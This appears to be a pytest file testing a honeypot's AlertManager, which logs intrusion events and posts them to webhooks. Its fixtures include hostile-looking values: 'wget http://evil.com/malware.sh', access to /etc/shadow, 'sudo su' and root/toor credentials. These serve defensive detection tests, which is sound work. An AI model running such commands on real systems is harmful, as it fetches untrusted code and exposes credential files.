"""
Tests for AlertManager class - alerting and webhook notifications.
"""

import json
from unittest.mock import patch, MagicMock

import pytest

import main
from main import AlertManager


class TestAlertManagerInit:
    """Tests for AlertManager initialization."""

    def test_init_without_webhook(self):
        """AlertManager should initialize without webhook URL."""
        manager = AlertManager()
        assert manager.webhook_url == ""
        assert manager.alert_count == 0

    def test_init_with_webhook(self):
        """AlertManager should store webhook URL."""
        manager = AlertManager("https://discord.com/api/webhooks/123")
        assert manager.webhook_url == "https://discord.com/api/webhooks/123"

    def test_init_alert_count_zero(self):
        """Alert count should start at zero."""
        manager = AlertManager()
        assert manager.alert_count == 0


class TestSendAlert:
    """Tests for sending alerts."""

    def test_send_alert_increments_count(self):
        """Sending alert should increment alert count."""
        manager = AlertManager()

        manager.send_alert("test_event", {"key": "value"})
        assert manager.alert_count == 1

        manager.send_alert("another_event", {})
        assert manager.alert_count == 2

    def test_send_alert_logs_to_alerts_logger(self):
        """Alert should be logged to alerts logger."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("login_attempt", {
                "ip": "192.168.1.1",
                "username": "admin"
            })

            mock_log.assert_called_once()
            logged_data = mock_log.call_args[0][0]
            parsed = json.loads(logged_data)

            assert parsed["type"] == "login_attempt"
            assert parsed["data"]["ip"] == "192.168.1.1"
            assert "timestamp" in parsed

    def test_send_alert_includes_timestamp(self):
        """Alert should include ISO format timestamp."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("test", {})

            logged_data = mock_log.call_args[0][0]
            parsed = json.loads(logged_data)

            assert "timestamp" in parsed
            # ISO format check
            assert "T" in parsed["timestamp"]

    def test_send_alert_no_webhook_no_http_call(self):
        """Without webhook URL, no HTTP request should be made."""
        manager = AlertManager("")  # No webhook

        with patch('urllib.request.urlopen') as mock_urlopen:
            manager.send_alert("test", {})
            mock_urlopen.assert_not_called()

    def test_send_alert_with_webhook_makes_http_call(self):
        """With webhook URL, HTTP request should be made."""
        manager = AlertManager("https://example.com/webhook")

        with patch('urllib.request.urlopen') as mock_urlopen:
            manager.send_alert("test_event", {"data": "value"})
            mock_urlopen.assert_called_once()

    def test_send_alert_webhook_post_json(self):
        """Webhook should POST JSON data."""
        manager = AlertManager("https://example.com/webhook")

        with patch('urllib.request.Request') as mock_request:
            with patch('urllib.request.urlopen'):
                manager.send_alert("test", {"key": "value"})

                mock_request.assert_called_once()
                call_args = mock_request.call_args

                # Check URL
                assert call_args[0][0] == "https://example.com/webhook"

                # Check data is JSON
                data = call_args[1]['data']
                parsed = json.loads(data.decode('utf-8'))
                assert parsed["type"] == "test"

                # Check Content-Type header
                headers = call_args[1]['headers']
                assert headers['Content-Type'] == 'application/json'

    def test_send_alert_webhook_failure_handled(self):
        """Webhook failure should be handled gracefully."""
        manager = AlertManager("https://example.com/webhook")

        with patch('urllib.request.urlopen') as mock_urlopen:
            mock_urlopen.side_effect = Exception("Connection failed")

            # Should not raise exception
            manager.send_alert("test", {})

            # Alert count should still increment
            assert manager.alert_count == 1


class TestAlertTypes:
    """Tests for different alert types."""

    def test_login_attempt_alert(self):
        """Login attempt alert should include IP, username, password."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("login_attempt", {
                "ip": "10.0.0.5",
                "username": "root",
                "password": "toor"
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "login_attempt"
            assert logged["data"]["ip"] == "10.0.0.5"
            assert logged["data"]["username"] == "root"
            assert logged["data"]["password"] == "toor"

    def test_new_connection_alert(self):
        """New connection alert should include IP and session ID."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("new_connection", {
                "ip": "192.168.1.100",
                "session_id": "abc12345"
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "new_connection"
            assert logged["data"]["session_id"] == "abc12345"

    def test_privilege_escalation_alert(self):
        """Privilege escalation alert should include command."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("privilege_escalation", {
                "ip": "10.0.0.1",
                "command": "sudo su"
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "privilege_escalation"
            assert logged["data"]["command"] == "sudo su"

    def test_malware_download_alert(self):
        """Malware download alert should include URL."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("malware_download_attempt", {
                "ip": "192.168.1.50",
                "command": "wget",
                "url": "http://evil.com/malware.sh",
                "full_command": "wget http://evil.com/malware.sh"
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "malware_download_attempt"
            assert logged["data"]["url"] == "http://evil.com/malware.sh"

    def test_sensitive_file_access_alert(self):
        """Sensitive file access alert should include file path."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("sensitive_file_access", {
                "ip": "10.0.0.10",
                "file": "/etc/shadow",
                "is_root": True
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "sensitive_file_access"
            assert logged["data"]["file"] == "/etc/shadow"
            assert logged["data"]["is_root"] is True

    def test_session_ended_alert(self):
        """Session ended alert should include summary stats."""
        manager = AlertManager()

        with patch.object(main.alerts_logger, 'info') as mock_log:
            manager.send_alert("session_ended", {
                "ip": "192.168.1.1",
                "session_id": "test1234",
                "duration": 125.5,
                "command_count": 15,
                "is_bot": True,
                "bot_reason": "superhuman_speed"
            })

            logged = json.loads(mock_log.call_args[0][0])
            assert logged["type"] == "session_ended"
            assert logged["data"]["duration"] == 125.5
            assert logged["data"]["is_bot"] is True


class TestGlobalAlertManager:
    """Tests for the global alert_manager instance."""

    def test_global_alert_manager_exists(self):
        """Global alert_manager should be initialized."""
        assert main.alert_manager is not None
        assert isinstance(main.alert_manager, AlertManager)

    def test_global_alert_manager_can_send_alerts(self):
        """Global alert_manager should be able to send alerts."""
        initial_count = main.alert_manager.alert_count

        with patch.object(main.alerts_logger, 'info'):
            main.alert_manager.send_alert("test", {})

        assert main.alert_manager.alert_count == initial_count + 1
